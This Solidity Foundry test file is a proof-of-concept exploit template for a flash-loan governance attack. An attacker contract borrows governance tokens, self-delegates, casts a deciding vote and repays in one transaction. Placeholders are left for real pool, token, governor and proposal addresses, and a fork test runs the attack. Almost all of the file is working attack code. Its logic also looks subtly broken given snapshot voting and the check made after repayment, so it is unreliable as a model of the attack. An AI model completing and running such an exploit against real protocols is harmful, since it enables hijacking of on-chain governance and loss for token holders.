// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Governance flash-loan vote
/// @notice A governance token's voting power is a snapshot / balance at
///         vote time. An attacker flash-borrows a huge amount, delegates
///         to themselves, casts the deciding vote, and repays -- all in ONE
///         transaction. No economic stake, full governance control.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: set POOL / GOV_TOKEN / GOVERNOR /
///      PROPOSAL_ID to the real ones. Combines 35-flash-loan-generic with
///      a governance vote in executeOperation().

interface IPool {
    function flashLoanSimple(
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IGovToken {
    function delegate(address delegatee) external;
    function getVotes(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

interface IGovernor {
    function castVote(uint256 proposalId, uint8 support) external returns (uint256);
    function state(uint256 proposalId) external view returns (uint8);
}

contract GovFlashAttacker {
    IPool public immutable pool;
    IGovToken public immutable govToken;
    IGovernor public immutable governor;
    uint256 public proposalId;

    constructor(address pool_, address govToken_, address governor_) {
        pool = IPool(pool_);
        govToken = IGovToken(govToken_);
        governor = IGovernor(governor_);
    }

    function attack(uint256 proposalId_, uint256 amount) external {
        proposalId = proposalId_;
        pool.flashLoanSimple(address(govToken), amount, bytes(""), 0);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address,
        bytes calldata
    ) external returns (bool) {
        // Flash-borrowed voting power, delegated to self, voted, repaid.
        govToken.delegate(address(this));
        governor.castVote(proposalId, 1); // 1 = for
        uint256 repay = amount + premium;
        govToken.approve(address(pool), repay);
        asset; // silence unused warning
        return true;
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: real pool / gov token / governor / proposal on this fork.
    address public constant POOL = address(0);
    address public constant GOV_TOKEN = address(0);
    address public constant GOVERNOR = address(0);
    uint256 public constant PROPOSAL_ID = 0;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        require(POOL != address(0) && GOV_TOKEN != address(0) && GOVERNOR != address(0), "set POOL / GOV_TOKEN / GOVERNOR");

        GovFlashAttacker attacker = new GovFlashAttacker(POOL, GOV_TOKEN, GOVERNOR);
        uint256 votesBefore = IGovToken(GOV_TOKEN).getVotes(address(attacker));
        attacker.attack(PROPOSAL_ID, 100000 ether);
        uint256 votesAfter = IGovToken(GOV_TOKEN).getVotes(address(attacker));
        uint8 proposalState = IGovernor(GOVERNOR).state(PROPOSAL_ID);
        console.log("attacker votes before:", votesBefore);
        console.log("attacker votes after flash vote:", votesAfter);
        console.log("proposal state:", proposalState);
        assertGt(votesAfter, votesBefore, "exploit did not reproduce: flash-borrowed votes did not land");

    }
}
